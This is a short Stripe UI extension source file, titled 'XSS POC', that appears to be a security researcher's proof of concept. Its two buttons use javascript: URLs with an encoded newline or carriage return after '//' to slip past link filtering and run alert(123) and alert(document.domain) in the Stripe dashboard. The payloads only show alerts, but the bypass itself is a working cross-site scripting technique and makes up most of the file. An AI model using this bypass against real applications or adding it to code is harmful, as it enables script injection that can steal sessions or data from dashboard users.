# test.htmlimport { Box, ContextView, Inline, Link } from "@stripe/ui-extension-sdk/ui";
import type { ExtensionContextValue } from "@stripe/ui-extension-sdk/context";
import {Button} from '@stripe/ui-extension-sdk/ui';
import {Img} from '@stripe/ui-extension-sdk/ui'
import {Chip, ChipList} from '@stripe/ui-extension-sdk/ui';

import BrandIcon from "./brand_icon.svg";

/**
 * This is a view that is rendered in the Stripe dashboard's customer detail page.
 * In stripe-app.json, this view is configured with stripe.dashboard.customer.detail viewport.
 * You can add a new view by running "stripe apps add view" from the CLI.
 */

const App = ({ userContext, environment }: ExtensionContextValue) => {
  return (
    <ContextView
      title="XSS POC"
      brandColor="#F6F8FA" // replace this with your brand color
      brandIcon={BrandIcon} // replace this with your brand icon
    >
	  
	  <Button href="javascript://%0aalert(123)">
		XSS with %0a
	  </Button>
	  <Button href="javascript://%0dalert(document.domain)">
		XSS with %0d
	  </Button>
	  
    </ContextView>
  );
};

export default App;
